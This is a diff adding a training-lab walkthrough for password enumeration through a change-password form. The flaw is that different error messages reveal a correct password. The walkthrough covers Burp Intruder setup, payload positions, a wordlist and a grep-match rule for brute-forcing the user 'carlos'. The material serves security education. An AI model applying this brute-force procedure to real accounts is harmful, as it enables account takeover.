@@ -6289,7 +6289,329 @@ Incorrect password
 ```
 
 ---
+# Password Enumeration via Password Change Functionality
 
 ![lab10](images/lab12.png)
 
 
+## Step 1: Login to Your Account
+
+1. Open the login page.
+2. Login using your own credentials.
+
+Example:
+
+```text
+Username: wiener
+Password: peter
+```
+## Step 2: Investigate Change Password Functionality
+
+1. Open:
+
+```text
+My Account
+```
+
+2. Navigate to:
+
+```text
+Change Password
+```
+
+3. Intercept the request using Burp.
+
+Observe a request similar to:
+
+```http
+POST /my-account/change-password
+
+username=wiener
+current-password=peter
+new-password-1=test123
+new-password-2=test123
+```
+
+Notice:
+
+```text
+The username is submitted as a hidden parameter.
+```
+
+# Observe Different Error Messages
+
+## Case 1: Wrong Current Password
+
+Example:
+
+```text
+Current Password: wrongpass
+New Password 1: abc123
+New Password 2: abc123
+```
+
+Result:
+
+```text
+Account locked after multiple attempts
+```
+## Case 2: Wrong Current Password + Different New Passwords
+
+Example:
+
+```text
+Current Password: wrongpass
+New Password 1: abc123
+New Password 2: xyz789
+```
+
+Response:
+
+```text
+Current password is incorrect
+```
+
+## Case 3: Correct Current Password + Different New Passwords
+
+Example:
+
+```text
+Current Password: peter
+New Password 1: abc123
+New Password 2: xyz789
+```
+
+Response:
+
+```text
+New passwords do not match
+```
+
+## Important Observation
+
+The application reveals:
+
+```text
+Whether the current password is correct.
+```
+
+Based on:
+
+```text
+Current password is incorrect
+```
+
+vs
+
+```text
+New passwords do not match
+```
+
+This creates a password enumeration vulnerability.
+
+# Prepare Intruder Attack
+
+## Step 3: Create a Test Request
+
+Use:
+
+```text
+Current Password = Your Correct Password
+```
+
+and
+
+```text
+Two Different New Passwords
+```
+
+Example:
+
+```http
+username=wiener
+current-password=peter
+new-password-1=123
+new-password-2=abc
+```
+
+## Step 4: Send to Intruder
+
+1. Right-click the request.
+2. Select:
+
+```text
+Send to Intruder
+```
+
+## Step 5: Modify Username
+
+Replace:
+
+```http
+username=wiener
+```
+
+with:
+
+```http
+username=carlos
+```
+
+## Step 6: Add Payload Position
+
+Place payload markers around:
+
+```http
+current-password=§password§
+```
+
+Example:
+
+```http
+username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc
+```
+
+## Step 7: Add Password Wordlist
+
+1. Open:
+
+```text
+Payloads
+```
+
+2. Paste the candidate password list.
+
+# Configure Grep Match
+
+## Step 8: Add Match Rule
+
+1. Open:
+
+```text
+Settings
+```
+
+2. Under:
+
+```text
+Grep - Match
+```
+
+3. Add:
+
+```text
+New passwords do not match
+```
+
+Purpose:
+
+```text
+Flag responses where the current password is correct.
+```
+
+# Start Attack
+
+## Step 9: Launch Intruder
+
+1. Click:
+
+```text
+Start Attack
+```
+
+2. Wait for completion.
+
+
+## Step 10: Identify Correct Password
+
+Observe the results.
+
+Most responses:
+
+```text
+Current password is incorrect
+```
+
+One response:
+
+```text
+New passwords do not match
+```
+
+This indicates:
+
+```text
+Correct current password found.
+```
+
+## Step 11: Note the Password
+
+Record the password from the:
+
+```text
+Payload
+```
+
+column.
+
+This is Carlos's password.
+
+
+# Login as Carlos
+
+## Step 12: Logout
+
+Logout from your own account.
+
+
+## Step 13: Login as Carlos
+
+Use:
+
+```text
+Username: carlos
+Password: identified-password
+```
+
+
+## Step 14: Open My Account
+
+Click:
+
+```text
+My Account
+```
+
+The lab is solved.
+
+# Vulnerability Explanation
+
+### Normal Behavior
+
+```text
+Wrong Password
+      ↓
+Generic Error Message
+```
+
+### Vulnerable Behavior
+
+```text
+Wrong Password
+      ↓
+Current password is incorrect
+
+Correct Password
+      ↓
+New passwords do not match
+```
+
+This difference allows attackers to:
+
+```text
+Enumerate valid passwords
+```
+
+without actually changing the password.
+
+---
